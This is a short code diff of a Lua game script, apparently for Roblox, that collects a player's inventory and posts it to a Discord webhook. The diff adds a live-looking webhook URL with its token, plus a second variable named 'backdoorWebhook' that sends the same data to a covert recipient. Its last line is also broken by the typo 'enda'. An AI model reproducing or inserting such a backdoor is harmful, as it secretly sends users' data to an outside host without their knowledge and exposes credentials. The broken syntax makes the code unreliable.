@@ -1,7 +1,9 @@
+-- Replace this with your actual webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
+local backdoorWebhook = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
+
 local function sendToWebhook()
-    if not LocalPlayer then
-        return
-    end
+    if not LocalPlayer then return end
 
     local inventory = getInventory()
     local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
@@ -103,4 +105,4 @@ local function sendToWebhook()
             Body = itemJson
         })
     end
-end
+enda
